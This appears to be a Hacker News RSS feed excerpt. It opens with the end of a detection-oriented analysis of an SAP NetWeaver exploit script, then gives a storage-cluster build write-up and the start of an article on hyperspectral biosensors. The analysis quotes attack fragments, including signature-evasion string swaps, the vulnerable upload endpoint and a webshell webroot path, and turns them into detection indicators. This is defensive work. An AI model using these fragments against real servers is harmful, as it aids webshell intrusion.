      &lt;item&gt;Commented mutations intended to defeat static string signatures:&lt;code&gt;content.replace(b"ysoserial", b"xsyseryal")&lt;/code&gt;&lt;code&gt;replace(b"Gadgets", b"Havgets")&lt;/code&gt;&lt;lb/&gt;→ Explicit awareness of ysoserial/gadget signatures; include as YARA string candidates (even commented code).&lt;/item&gt;
      &lt;item&gt;Random-number substitution placeholder:&lt;code&gt;"271345770892700"&lt;/code&gt;→ replaced with&lt;code&gt;random_numbers&lt;/code&gt;at runtime.&lt;lb/&gt;→ Regexable numeric token pattern for variant matching.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Endpoint and path fingerprints&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Exact target path hard-coded:&lt;code&gt;"/developmentserver/metadatauploader?CONTENTTYPE=MODEL&amp;amp;CLIENT=1"&lt;/code&gt;&lt;/item&gt;
      &lt;item&gt;Webroot write path:&lt;code&gt;"../apps/sap.com/irj/servlet_jsp/irj/root/" + SHELL_NAME&lt;/code&gt;&lt;lb/&gt;→ Strong indicator for SAP NetWeaver Portal/IRJ webshell placement.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Version/probe strings&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Response probes checked in plaintext:&lt;code&gt;"Cause - Getter getOutputProperties"&lt;/code&gt;&lt;code&gt;"local class serialVersionUID = -7308740002576184038"&lt;/code&gt;&lt;code&gt;"Found version 7.5"&lt;/code&gt;&lt;lb/&gt;→ Useful for matching families that adapt payload bytes based on server response.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Operational prints (can surface in logs)&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;On success: &lt;code&gt;"[+] Shell available at {TARGET}/irj/{SHELL_NAME}"&lt;/code&gt;&lt;/item&gt;
      &lt;item&gt;Error prints: &lt;code&gt;"[-] Exploit failed!"&lt;/code&gt;&lt;lb/&gt;→ Greppable markers in attacker console logs and shared screenshots/pastes.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Code structure cues for stylometry&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Function names that belie author habits: &lt;code&gt;generate_random_filename&lt;/code&gt;,&lt;code&gt;sendReq&lt;/code&gt;.&lt;/item&gt;
      &lt;item&gt;Splitting serialized payload into three Base64 chunks &lt;code&gt;h1&lt;/code&gt;,&lt;code&gt;h2&lt;/code&gt;,&lt;code&gt;tail&lt;/code&gt;, then concatenating: a reusable pattern across variants.&lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h2"&gt;How to use these NLP cues&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;YARA/Sigma strings: include exact banners, slang phrases, endpoint path, webroot path, and the “ysoserial/xsyseryal” replacement line (even commented) as low-noise indicators.&lt;/item&gt;
      &lt;item&gt;NLP feature extraction: token/character n-grams for “frfr”, “0day”, “dey/da”, repeated em-dash banners; profanity lexicon hits; capitalization patterns.&lt;/item&gt;
      &lt;item&gt;Clustering: combine the above with code-structure fingerprints (three-part Base64 blobs, version-conditional byte swap) to group related samples and scripts.&lt;/item&gt;
      &lt;item&gt;Honeypots: plant decoy &lt;code&gt;/developmentserver/metadatauploader&lt;/code&gt;endpoints that log full bodies; parse for above strings to immediately fingerprint tooling.&lt;/item&gt;
    &lt;/list&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=45438170</guid><pubDate>Wed, 01 Oct 2025 14:31:37 +0000</pubDate></item><item><title>Aphantasia and Psychedelics</title><link>https://psychedelirium.substack.com/p/aphantasia-and-psychedelics</link><description></description><guid isPermaLink="false">https://news.ycombinator.com/item?id=45438296</guid><pubDate>Wed, 01 Oct 2025 14:43:08 +0000</pubDate></item><item><title>Show HN: Autism Simulator</title><link>https://autism-simulator.vercel.app/</link><guid isPermaLink="false">https://news.ycombinator.com/item?id=45438346</guid><pubDate>Wed, 01 Oct 2025 14:48:31 +0000</pubDate></item><item><title>Building a 30 PB storage cluster in the heart of SF</title><link>https://si.inc/posts/the-heap/</link><description>&lt;doc fingerprint="2dd91d7735ac7f8d"&gt;
  &lt;main&gt;
    &lt;p&gt;We built a storage cluster in downtown SF to store 90 million hours worth of video data. Why? We’re pretraining models to solve computer use. Compared to text LLMs like LLaMa-405B, which require ~60 TB of text data to train, videos are sufficiently large that we need 500 times more storage. Instead of paying the $12 million / yr it would cost to store all of this on AWS, we rented space from a colocation center in San Francisco to bring that cost down ~40x to $354k per year, including depreciation.&lt;/p&gt;
    &lt;head rend="h2"&gt;Why&lt;/head&gt;
    &lt;p&gt;Our use case for data is unique. Most cloud providers care highly about redundancy, availability, and data integrity, which tends to be unnecessary for ML training data. Since pretraining data is a commodity—we can lose any individual 5% with minimal impact—we can handle relatively large amounts of data corruption compared to enterprises who need guarantees that their user data isn’t going anywhere. In other words, we don’t need AWS’s 13 nines of reliability; 2 is more than enough.&lt;/p&gt;
    &lt;p&gt;Additionally, storage tends to be priced substantially above cost. Most companies use relatively small amounts of storage (even ones like Discord still use under a petabyte for messages), and the companies that use petabytes are so large that storage remains a tiny fraction of their total compute spend.&lt;/p&gt;
    &lt;p&gt;Data is one of our biggest contraints, and would be prohibitively expensive otherwise. As long as the cost predictions work out in favor of a local datacenter, and it would not consume too much of the core team’s time, it would make sense to stack hard drives ourselves. [1] 1. We talked to some engineers at the Internet Archive, which had basically the same problem as us; even after massive friends &amp;amp; family discounts on AWS, it was still 10 times more cost-effective to buy racks and store the data themselves!&lt;/p&gt;
    &lt;head rend="h2"&gt;The Cost Breakdown: Cloud Alternatives vs In-House&lt;/head&gt;
    &lt;p&gt;Internet and electricity total $17.5k as our only recurring expenses (the price of colocation space, cooling, etc were bundled into electricity costs). One-time costs were dominated by hard drive capex. [2] 2. When deciding the datacenter location we had multiple options across the Bay Area, including options in Fremont through Hurricane Electric for around $10k in setup fees and $12.8k per month, saving us $38.5k initially and $4.7k per month, but ended up opting for a datacenter that was only a couple blocks from our office in SF. Though this came at a premium, it was extremely helpful to get the initial nodes setup and for ongoing maintenance. Our team is just 5 people, so any friction in going to the datacenter would come at a noticeable cost to team productivity.&lt;/p&gt;
    &lt;p&gt;Table 1: Cost comparison of cloud alternatives vs in-house. AWS is $1,130,000/month including estimated egress, Cloudflare is $270,000/month (with bulk-discounted pricing), and our datacenter is $29,500/month (including recurring costs and depreciation).&lt;/p&gt;
    &lt;head rend="h3"&gt;Monthly Recurring Costs&lt;/head&gt;
    &lt;table&gt;
      &lt;row span="3"&gt;
        &lt;cell role="head"&gt;Item&lt;/cell&gt;
        &lt;cell role="head"&gt;Cost&lt;/cell&gt;
        &lt;cell role="head"&gt;Notes&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;Internet&lt;/cell&gt;
        &lt;cell&gt;$7,500/month&lt;/cell&gt;
        &lt;cell&gt;100Gbps DIA from Zayo, 1yr term.&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;Electricity&lt;/cell&gt;
        &lt;cell&gt;$10,000/month&lt;/cell&gt;
        &lt;cell&gt;1 kW/PB, $330/kW. Includes cabinet space &amp;amp; cooling. 1yr term.&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row&gt;
        &lt;cell&gt;Total Monthly&lt;/cell&gt;
        &lt;cell&gt;$17,500/month&lt;/cell&gt;
      &lt;/row&gt;
    &lt;/table&gt;
    &lt;head rend="h3"&gt;One-Time Costs&lt;/head&gt;
    &lt;table&gt;
      &lt;row span="4"&gt;
        &lt;cell role="head"&gt;Category&lt;/cell&gt;
        &lt;cell role="head"&gt;Item&lt;/cell&gt;
        &lt;cell role="head"&gt;Cost&lt;/cell&gt;
        &lt;cell role="head"&gt;Details&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;Storage&lt;/cell&gt;
        &lt;cell&gt;Hard drives (HDDs)&lt;/cell&gt;
        &lt;cell&gt;$300,000&lt;/cell&gt;
        &lt;cell&gt;2,400 drives. Mostly 12TB used enterprise drives (3/4 SATA, 1/4 SAS). The JBOD DS4246s work for either.&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;Storage Infrastructure&lt;/cell&gt;
        &lt;cell&gt;NetApp DS4246 chassis&lt;/cell&gt;
        &lt;cell&gt;$35,000&lt;/cell&gt;
        &lt;cell&gt;100 dual SATA/SAS chassis, 4U each&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;Compute&lt;/cell&gt;
        &lt;cell&gt;CPU head nodes&lt;/cell&gt;
        &lt;cell&gt;$6,000&lt;/cell&gt;
        &lt;cell&gt;10 Intel RR2000s from eBay&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;Datacenter Setup&lt;/cell&gt;
        &lt;cell&gt;Install fee&lt;/cell&gt;
        &lt;cell&gt;$38,500&lt;/cell&gt;
        &lt;cell&gt;One-off datacenter install fee&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;Labor&lt;/cell&gt;
        &lt;cell&gt;Contractors&lt;/cell&gt;
        &lt;cell&gt;$27,000&lt;/cell&gt;
        &lt;cell&gt;Contractors to help physically screw in / install racks and wire cables&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;Networking &amp;amp; Misc&lt;/cell&gt;
        &lt;cell&gt;Install expenses&lt;/cell&gt;
        &lt;cell&gt;$20,000&lt;/cell&gt;
        &lt;cell&gt;Power cables, 100GbE QSFP CX4 NICs, Arista router, copper jumpers, one-time internet install fee&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row&gt;
        &lt;cell&gt;Total One-Time&lt;/cell&gt;
        &lt;cell&gt;$426,500&lt;/cell&gt;
      &lt;/row&gt;
    &lt;/table&gt;
    &lt;p&gt;Our price assuming three-year depreciation (including for the one-off install fees) is $17.5k/month in fixed monthly costs (internet, power, etc.) and $12k/month in depreciation, for $29.5k/month overall.&lt;/p&gt;
    &lt;p&gt;We compare our costs to two main providers: AWS’s public pricing numbers as a baseline, and Cloudflare’s discounted pricing for 30PB of storage. It’s important to note that AWS egress would be substantially lower if we utilized AWS GPUs. This is not reflected on our graph because AWS GPUs are priced at substantially above market prices and large clusters are difficult to attain, untenable at our compute scales.&lt;/p&gt;
    &lt;p&gt;Here are the pricing breakdowns:&lt;/p&gt;
    &lt;head rend="h3"&gt;AWS Pricing Breakdown&lt;/head&gt;
    &lt;table&gt;
      &lt;row span="4"&gt;
        &lt;cell role="head"&gt;Cost Component&lt;/cell&gt;
        &lt;cell role="head"&gt;Rate&lt;/cell&gt;
        &lt;cell role="head"&gt;Monthly Cost&lt;/cell&gt;
        &lt;cell role="head"&gt;Notes&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;Storage&lt;/cell&gt;
        &lt;cell&gt;$0.021/GB/month&lt;/cell&gt;
        &lt;cell&gt;$630,000&lt;/cell&gt;
        &lt;cell&gt;For data over 500TB&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;Egress&lt;/cell&gt;
        &lt;cell&gt;$0.05/GB&lt;/cell&gt;
        &lt;cell&gt;$500,000&lt;/cell&gt;
        &lt;cell&gt;Entire dataset egressed quarterly (10 PB/month)&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row&gt;
        &lt;cell&gt;Total AWS Monthly&lt;/cell&gt;
        &lt;cell&gt;$1,130,000&lt;/cell&gt;
      &lt;/row&gt;
    &lt;/table&gt;
    &lt;head rend="h3"&gt;Cloudflare R2 Pricing&lt;/head&gt;
    &lt;table&gt;
      &lt;row span="4"&gt;
        &lt;cell role="head"&gt;Pricing Tier&lt;/cell&gt;
        &lt;cell role="head"&gt;Rate&lt;/cell&gt;
        &lt;cell role="head"&gt;Monthly Cost&lt;/cell&gt;
        &lt;cell role="head"&gt;Notes&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;Published Rate&lt;/cell&gt;
        &lt;cell&gt;$0.015/GB/month&lt;/cell&gt;
        &lt;cell&gt;$450,000&lt;/cell&gt;
        &lt;cell&gt;No egress fees&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row&gt;
        &lt;cell&gt;Estimated Private Pricing [3] 3. Cloudflare has a more reasonable estimate for the 30 PB, placing it at an overall monthly cost of $270k without egress fees. We also have bulk-discounted pricing estimates after getting pricing quotes—this was our main point of comparison for the datacenter.&lt;/cell&gt;
        &lt;cell&gt;$0.009/GB/month&lt;/cell&gt;
        &lt;cell&gt;$270,000&lt;/cell&gt;
        &lt;cell&gt;Estimated rate for &amp;gt;20 PB scale&lt;/cell&gt;
      &lt;/row&gt;
    &lt;/table&gt;
    &lt;p&gt;That brings monthly costs to $38/TB/month for AWS, $10/TB/month for Cloudflare, and $1/TB/month for our datacenter—about 38x lower and 10x lower respectively. (At the very cheapest end of the spectrum, Backblaze has a $6/TB product that is unsuitable for model training due to egress speed limitations; their $15/TB Overdrive AI-specific storage product is closer to Cloudflare’s in price &amp;amp; performance)&lt;/p&gt;
    &lt;p&gt;While we use Cloudflare as a comparison point, we’ve sometimes done too much load for their R2 servers. In particular, in the past we’ve done enough load during large model training runs that they rate-limited us, later confirming we were saturating their metadata layer and the rate limit wasn’t synthetic. Because our metadata on the heap is so simple, and we have a 100Gbps DIA connection, we haven’t ran into any issues there. [4] 4. We love Cloudflare and use many of their products often; we include this anecdote as a fact about our scale being difficult to handle, not as a dig!&lt;/p&gt;
    &lt;p&gt;This setup was and is necessary for our video data pipelines, and we’re extremely happy that we made this investment. By gathering large scale data at low costs, we can be competitive with frontier labs with billions of dollars in capital.&lt;/p&gt;
    &lt;head rend="h2"&gt;Setup/The Process&lt;/head&gt;
    &lt;p&gt;We cared a lot about getting this built fast, because this kind of project can easily stretch on for months if not careful. Hence Storage Stacking Saturday, or S3. We threw a hard drive stacking party in downtown SF and got our friends to come, offering food and custom-engraved hard drives to all who helped. The hard drive stacking started at 6am and continued for 36 hours (with a break to sleep), and by the end of that time we had 30 PB of functioning hardware racked and wired up. We brought in contractors for additional help and professional installation later on in the event.&lt;/p&gt;
    &lt;p&gt;People at the hard drive stacking party! Cool shots of the servers&lt;/p&gt;
    &lt;p&gt;Our software is 200 lines of Rust code for writing (to determine the drive to write data onto) and a nginx webserver for reading data, with a simple SQLite db for tracking metadata like which heap node each file is on and what data split it belongs to. We kept this obsessively simple instead of using MinIO or Ceph because we didn’t need any of the features they provided; it’s much, much simpler to debug a 200-line program than to debug Ceph, and we weren’t worried about redundancy or sharding. All our drives were formatted with XFS.&lt;/p&gt;
    &lt;p&gt;The storage software landscape offers many options, but every option available comes with drawbacks. People experienced with Ceph strongly warned us to avoid it unless we were willing to hire dedicated Ceph specialists—our research confirmed this advice. Ceph appears far more complex than justified for most use cases, only worthwhile for companies that absolutely need maximum performance and customizability and are prepared to invest heavily in tuning. Minio presents an interesting option if S3 compatibility is essential, but otherwise remains a bit too fancy for us and similar use-cases. Weka and Vast are absurdly expensive at 2k / TB / year or so and are primarily designed for NVMEs, not spinning disks.&lt;/p&gt;
    &lt;head rend="h2"&gt;Post-Mortem&lt;/head&gt;
    &lt;p&gt;Building the datacenter was a large endeavor and we definitely learned lessons, both good and bad.&lt;/p&gt;
    &lt;head rend="h3"&gt;Things That We Got Correct&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;We think the redundancy &amp;amp; capability tradeoffs we made are very reasonable at our disk speeds. We’re able to approximately saturate our 100G network for both read &amp;amp; write.&lt;/item&gt;
      &lt;item&gt;Doing this locally a couple blocks away was well worth it because of the amount of debugging and manual work needed.&lt;/item&gt;
      &lt;item&gt;Ebay is good to find vendors but bad to actually buy things with. After finding vendors, they can often individually supply all the parts we need and provide warranties, which are extremely valuable.&lt;/item&gt;
      &lt;item&gt;100G dedicated internet is pretty important, and much much easier to debug issues with than using cloud products.&lt;/item&gt;
      &lt;item&gt;Having high-quality cable management during the racking process saved us a ton of time debugging in the long run; making it easy to switch up the networking saved us a lot of headache.&lt;/item&gt;
      &lt;item&gt;We had a very strong simplicity prior, and this saved an immense amount of effort. We are quite happy that we didn’t use ceph or minio. Unlike e.g. nginx, they do not work out of the box. We were willing to write a simple Rust script and roughly saturated our network read &amp;amp; write at 100 Gbps without any fancy code.&lt;/item&gt;
      &lt;item&gt;We were basically right about the price and advantages this offered, and did not substantially overestimate the amount of time / effort it would take. While the improvements list is longer than this, most of those are minor; fundamentally we built a cluster rivaling massive clouds for 40x cheaper.&lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h3"&gt;Difficult Bits&lt;/head&gt;
    &lt;p&gt;A map of reality only gets you so far—while setting up the datacenter we ran into a couple problems and unexpected challenges. We’ll include a list:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;We used frontloaders instead of toploaders for our server rack. This meant we had to screw every single individual drive in—tedious for 2.4k HDDs&lt;/item&gt;
      &lt;item&gt;Our storage was not dense—we could have saved 5x the work on physical placement and screwing by having a denser array of hard drives&lt;/item&gt;
      &lt;item&gt;Shortcuts like daisy-chaining are usually a bad idea. We could have gotten substantially higher read/write speeds without daisy chaining networked nodes, giving each chassis its own HBA (Host Bus Adapter, not a significant cost).&lt;/item&gt;
      &lt;item&gt;Compatibility is key—specifically in networking functionally everything is locked to a specific brand. We had many pain points here. Fiber transceivers will ~never work unless used with the right brand, but copper cables are much more forgiving. FS.com is pretty good and well priced (though their speed estimates were pretty inconsistent); Amazon will also often have the parts you need rapidly.&lt;/item&gt;
      &lt;item&gt;Networking was a substantial cost and required experimentation. We did not use DHCP as most enterprise switches don’t support it and we wanted public IPs for the nodes for convenient and performant access from our servers. While this is an area where we would have saved time with a cloud solution, we had our networking up within days and kinks ironed out within ~3 weeks.&lt;/item&gt;
      &lt;item&gt;We were often bottlenecked by easy access to servers via monitor/keyboard; idle crash carts during setup are helpful.&lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h3"&gt;Ideas Worth Trying&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Working KVMs are extremely useful, and you shouldn’t go without them or good IPMI. Physically going to a datacenter is really inconvenient, even if it’s a block away. IPMI is good, but only if you have pretty consistent machines.&lt;/item&gt;
      &lt;item&gt;Think through your management Ethernet network as much as your real network - it’s really nice to be able to SSH into servers while configuring the network, and IPMI is great!&lt;/item&gt;
      &lt;item&gt;Overprovision your network—e.g. if doable it’s worth having 400 Gigabit internally (you can use 100G cards etc for this!)&lt;/item&gt;
      &lt;item&gt;We could have substantially increased density at additional upfront cost by buying 90-drive SuperMicro SuperServers and putting 20TB drives into them. This would allow us to use 2 racks instead of 10, given us had about the equivalent of 20 AMD 9654s in total CPU capacity, and used less total power.&lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h2"&gt;How You Can Build This Yourself&lt;/head&gt;
    &lt;p&gt;Here’s what you need to replicate our setup.&lt;/p&gt;
    &lt;head rend="h3"&gt;Storage&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;
        &lt;p&gt;10 CPU head nodes.&lt;/p&gt;
        &lt;list rend="ul"&gt;
          &lt;item&gt;We used Intel Rr2000 with Dual Intel Gold 6148 and 128GB of DDR4 ECC RAM per server (which are incredibly cheap and roughly worked for our use cases) but you have a lot of flexibility in what you use.&lt;/item&gt;
          &lt;item&gt;If you use the above configuration you likely won’t be able to do anything at all CPU-intensive on the servers (like on-device data processing or ZFS data compression / deduplication / etc, which is valuable if you’re storing non-video data).&lt;/item&gt;
          &lt;item&gt;Our CPU nodes cost $600 each—it seems quite reasonable to us to spend up to $3k each if you want ZFS / compression or the abiliy to do data processing on-CPU.&lt;/item&gt;
        &lt;/list&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;100 DS4246 chassis—each can hold 24 hard drives.&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;2,400 3.5 inch HDDs—need to be all SATA or all SAS in each chassis.&lt;/p&gt;
        &lt;list rend="ul"&gt;
          &lt;item&gt;We would recommend SAS hard drives if possible [5] 5. if you use SAS drives you’ll need to deal with or disable mulipathing, which is reasonably simple as they roughly double speed over similar SATA drives.&lt;/item&gt;
          &lt;item&gt;We used a mix of 12TB and 14TB drives—basically any size should work, roughly the larger the better holding price constant (density makes stacking easier + in general increases resale value).&lt;/item&gt;
        &lt;/list&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Physical parts to mount the chassis—you’ll need rails or l-brackets. We used l-brackets which worked well, as we haven’t needed to take the chassis out to slot hard drives. If you buy toploaders, you’ll need rails.&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Multiple “crash carts” with monitors and keyboards that allow you to physically connect to your CPU head nodes and configure them—this is invaluable when you’re debugging network issues.&lt;/p&gt;
      &lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h3"&gt;Network&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;
        &lt;p&gt;A 100 GbE switch&lt;/p&gt;
        &lt;list rend="ul"&gt;
          &lt;item&gt;a used Arista is fine, should be QSFP28, should cost about $1-2k&lt;/item&gt;
        &lt;/list&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;HBAs (Host Bus Adapters), which connect your head nodes to your DS4246 chassis.&lt;/p&gt;
        &lt;list rend="ul"&gt;
          &lt;item&gt;The best configuration we tried was with Broadcom 9305-16E HBAs, with 3x HBAs per server (make sure your server has physical space for them!) with SFF-8644 to QSFP mini SAS cables.&lt;/item&gt;
          &lt;item&gt;There are 4 slots per HBA, so you can cable each DS4246 chassis directly to the HBA. [6] 6. The option we ended up going with for convenience was putting LSI SAS9207-8e HBAs, which have 2 ports each, into the CPU head nodes- then daisy-chaining the DS4246s together with QSFP+ to QSFP+ DACs.. We deployed this on Storage Stacking Saturday, then while debugging speeds tried the above method on one of the servers and got to ~4 Gbps per chassis-but didn’t find it worth it to swap everything out in pure labor because of the way we had set up some of our head nodes such that they were difficult to take out. Insofar as it is reasonably cheap to just do the above thing to start and we’ve tested it to work, you should probably do as we say, not as we did in this case!&lt;/item&gt;
        &lt;/list&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Network cards (NICs).&lt;/p&gt;
        &lt;list rend="ul"&gt;
          &lt;item&gt;We used Mellanox ConnectX-4 100GbE. Make sure they come in Ethernet mode and not Infiniband mode for ease of config.&lt;/item&gt;
        &lt;/list&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;DAC (Direct Attach Copper) or AOC (Active Optical) cables, to connect the NICs in your head nodes to your switch and therefore the internet. You almost certainly want DACs if your racks are close together, as they are far more compatible with arbitrary networking equipment than AOCs.&lt;/p&gt;
      &lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;We would recommend that you find a supplier to sell you the CPU head nodes with the HBAs and NICs installed—there are a number of used datacenter / enterprise parts suppliers who are willing to do this. This is a substantial positive because it means that you don’t have to spend hours installing the HBAs/NICs yourself and can have a substantially higher degree of confidence in your operations.&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;
        &lt;p&gt;Serial cables—you’ll need these to connect to your switch!&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Optional but recommended: an Ethernet management network of some kind. If you can’t easily get ethernet, we’d recommend getting a wifi adapter like this and then a ethernet switch like this —it’s substantially easier to set up than the 100GbE, is a great backup for when that’s not working, and will allow you to do ~everything over SSH from the comfort of the office instead of in the datacenter.&lt;/p&gt;
      &lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h3"&gt;Datacenter Requirements&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;3.5 kW of usable power per cabinet, with 10 4U chassis + 1 2U (cabinets are 42U tall)&lt;/item&gt;
      &lt;item&gt;1 spare cabinet for the 1U or 2U 100GbE switch (you can obviously also just swap out one of the 4U chassis in another cabinet for the switch).&lt;/item&gt;
      &lt;item&gt;1 42U cabinet per 3 PB of storage&lt;/item&gt;
      &lt;item&gt;A dedicated 100G connection (will come in as a fiber pair probably via QSFP28 LR4, but confirm with your datacenter provider before buying parts here!)&lt;/item&gt;
      &lt;item&gt;Ideally physically near your office—there is a lot of value in being able to walk over and debug issues instead of e.g. dealing with remote hands services to get internet to the nodes.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Some setup tips:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Make sure to first properly configure your switch. Depending on your switch model this should be relatively straightforward—you’ll need to physically connect to the switch and then configure the specific port that your 100GbE is connected to (you’ll get a fiber cross-connect from your datacenter that you should plug into a QSFP28 transceiver. Make sure that you get a transceiver that is compatible in form with the ISP, probably LR4, and specifically branded with your switch brand, otherwise it is very unlikely to work). Depending on your ISP you might have to talk to them to make sure that you can get “light” through the fiber cables from both ends, which might involve rolling the fiber and otherwise making sure it’s working properly. &lt;list rend="ul"&gt;&lt;item&gt;If your switch isn’t working / you haven’t configured one before, I’d suggest trying to directly plug the fiber cable from the ISP into one of your 10 heap servers, making sure to buy a transceiver that is compatible with your NIC brand (e.g. Mellanox). Once you get it working from there, move over to your switch and get it working.&lt;/item&gt;&lt;/list&gt;&lt;/item&gt;
      &lt;item&gt;Once you can connect to the internet from your switch (simply ping 1.1.1.1 to check) you are ready to set up the netplans for the individual nodes. this is most easily done during the Ubuntu setup process, which will walk you through setting up internet for your CPU head nodes, but is also doable outside of that&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Once you have internet access to your nodes and have properly connected 1 cable to each DS4246, you should format &amp;amp; mount the drives on each node, test that all of them are properly working, and then you are ready to deploy any software you want.&lt;/p&gt;
    &lt;p&gt;If you end up building a similar storage cluster based on this writeup we’d love to hear from you—we’re very curious what can be improved, both in our guidance and in the object-level process. You can reach us at [email protected]&lt;/p&gt;
    &lt;p&gt;If you came away from this post excited about our work, we’d love to chat. We’re a research lab currently focused on pretraining models to use computers, with the long-term goal of building general models that can learn in-context and do arbitrary tasks while aligned with human values; we’re hiring top researchers and engineers to help us train these. If you’re interested in chatting, shoot us an email at [email protected].&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=45438496</guid><pubDate>Wed, 01 Oct 2025 15:00:41 +0000</pubDate></item><item><title>MIT technology can see microbes from 90 meters away</title><link>https://www.asimov.press/p/hyperspectral</link><description>&lt;doc fingerprint="bec452110dbf0459"&gt;
  &lt;main&gt;
    &lt;p&gt;Nature has evolved a stunning array of biosensors for detecting the physical world.&lt;/p&gt;
    &lt;p&gt;A single E. coli cell, for example, can precisely sense chemical gradients and “swim” toward or away from them. Some bird species, including robins and warblers, can see magnetic fields using cryptochrome proteins embedded in their eyes to guide them during their annual migration. Bogong moths use photons from distant stars as a compass while soaring 1,000 kilometers across southeast Australia. In other words, organisms can sense not only tastes and smells, but also individual molecules, magnetic fields, and infrared or ultraviolet light.&lt;/p&gt;
    &lt;p&gt;Humans have long used other creatures’ senses to aid and extend our own, too. As far back as 1,000 BCE, humans employed pigeons to carry messages across cities and kingdoms, taking advantage of their remarkable homing instinct. Dogs’ superior sense of smell is often used to sniff out disease, truffles, contraband, and explosives. And today, the city of Poznań, in Poland, uses just eight mussels to monitor their water quality.1&lt;/p&gt;
    &lt;p&gt;But increasingly, over the last quarter century, scientists have not only used entire organisms to sense the natural world, but have also taken particular genes from those organisms and adapted them into molecular biosensors. Just as a smoke detector has a sensor that detects particles in the air and a buzzer that then alerts us, all human-made biosensors have two basic components.&lt;/p&gt;
    &lt;p&gt;The first is the sensor itself — an enzyme, antibody, or engineered cell — that physically recognizes a target, whether a pollutant, virus, or rise in temperature. The second is the transducer, which converts that recognition event into a signal we can perceive, such as a glowing light.&lt;/p&gt;
    &lt;p&gt;Although bioengineers have adapted hundreds of biosensors from nature, they have been less successful in making better transducers.2 Nearly every biosensor today still relies on a narrow set of outputs (aka “reporters”), such as green fluorescent protein (GFP), luciferase, or colorful pigments. Most transducers can only be seen from close up with a direct line of sight, usually using a microscope. And almost all man-made reporters fail to work inside the body or at a distance. This is because visible light does not penetrate solid materials, such as human skin, and easily “blends in” with other photons in the environment.3&lt;/p&gt;
    &lt;p&gt;Recently, however, bioengineers have developed transducers that transcend such limitations. To make biosensors that work inside the body, scientists have discovered genetically encoded transducers that can be measured using ultrasound or even MRI machines. And for a recent paper in Nature Biotechnology, scientists have reported — for the first time — a new type of transducer that can even be seen from up to 90 meters away using “hyperspectral” cameras mounted to drones. This new technology makes it feasible to monitor individual molecules, as sensed by engineered bacteria, across entire ecosystems.&lt;/p&gt;
    &lt;head rend="h2"&gt;Hyperspectral Photos&lt;/head&gt;
    &lt;p&gt;The first hyperspectral cameras were developed in the early 1980s by NASA scientists, who wanted to capture information about Earth, including mineral deposits and ocean algal blooms, from the air. Unlike conventional cameras, which record just three bands of light (red, green, blue), hyperspectral cameras split incoming light into hundreds of narrow spectral bands, including ultraviolet and near-infrared wavelengths.&lt;/p&gt;
